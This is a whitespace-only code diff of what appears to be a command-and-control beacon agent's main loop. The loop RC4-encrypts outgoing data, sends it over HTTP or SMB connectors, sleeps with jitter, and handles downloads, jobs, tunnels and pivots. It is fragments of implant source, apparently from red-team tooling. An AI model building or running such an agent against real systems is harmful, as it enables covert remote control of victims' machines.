@@ -7,14 +7,14 @@
 
 Agent* g_Agent;
 
-#if defined(BEACON_HTTP) 
+#if defined(BEACON_HTTP)
 
 #include "ConnectorHTTP.h"
 ConnectorHTTP* g_Connector;
 
 void AgentMain()
 {
-	if ( !ApiLoad() ) 
+	if ( !ApiLoad() )
 		return;
 
 	g_Agent  = (Agent*) MemAllocLocal(sizeof(Agent));
@@ -40,7 +40,7 @@ void AgentMain()
 			EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);
 
 			g_Connector->SendData(packerOut->data(), packerOut->datasize());
-			
+
 			packerOut->Clear(TRUE);
 			packerOut->Pack32(0);
 		}
@@ -58,7 +58,7 @@ void AgentMain()
 		if (g_Agent->IsActive() && packerOut->datasize() < 8 )
 			WaitMask(g_Agent->GetWorkingSleep(), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay );
 
-		g_Agent->downloader->ProcessDownloader(packerOut);			
+		g_Agent->downloader->ProcessDownloader(packerOut);
 		g_Agent->jober->ProcessJobs(packerOut);
 		g_Agent->proxyfire->ProcessTunnels(packerOut);
 		g_Agent->pivotter->ProcessPivots(packerOut);
@@ -81,7 +81,7 @@ void AgentMain()
 
 
 
-#elif defined(BEACON_SMB) 
+#elif defined(BEACON_SMB)
 
 #include "ConnectorSMB.h"
 ConnectorSMB* g_Connector;
